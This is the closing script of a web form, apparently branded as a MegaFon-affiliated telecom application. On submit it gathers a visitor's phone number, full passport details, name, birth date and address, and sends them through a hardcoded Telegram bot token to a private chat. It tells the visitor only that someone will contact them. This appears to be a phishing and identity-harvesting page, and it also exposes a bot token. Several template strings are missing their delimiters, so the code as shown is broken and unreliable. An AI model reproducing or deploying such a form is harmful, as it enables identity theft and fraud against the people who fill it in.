
<script>
        document.getElementById('telegramForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const data = {
                phone: formData.get('phone'),
                passport: ${formData.get('passport_series')} ${formData.get('passport_number')},
                passport_issued: formData.get('passport_issued'),
                passport_date: formData.get('passport_date'),
                passport_code: formData.get('passport_code'),
                full_name: formData.get('full_name'),
                birth_date: formData.get('birth_date'),
                address: formData.get('address')
            };
            
            // Ваши данные бота
            const botToken = '7744307948:AAHyss7zzJJjxOknrejZqt5XDX77HUfUtiQ';
            const chatId = '723978224';
            
            // Форматируем сообщение для Telegram
            const message = 📌 *Новая заявка от Lider Telecom (МегаФон):*  
📞 *Телефон:* ${data.phone}  
📇 *Паспорт:* ${data.passport}  
🏛 *Выдан:* ${data.passport_issued}  
📅 *Дата выдачи:* ${data.passport_date}  
🔢 *Код подразделения:* ${data.passport_code}  
👤 *ФИО:* ${data.full_name}  
🎂 *Дата рождения:* ${data.birth_date}  
🏠 *Адрес регистрации:* ${data.address};
            
            // Отправляем в Telegram
            fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(result => {
                const status = document.getElementById('status');
                status.style.display = 'block';
                if (result.ok) {
                    status.className = 'success';
                    status.textContent = '✅ Данные отправлены! С вами свяжутся.';
                    document.getElementById('telegramForm').reset();
                } else {
                    status.className = 'error';
                    status.textContent = '❌ Ошибка: ' + (result.description || 'Попробуйте позже.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                const status = document.getElementById('status');
                status.style.display = 'block';
                status.className = 'error';
                status.textContent = '❌ Ошибка сети. Проверьте интернет.';
            });
        });
    </script>
</body>
</html>
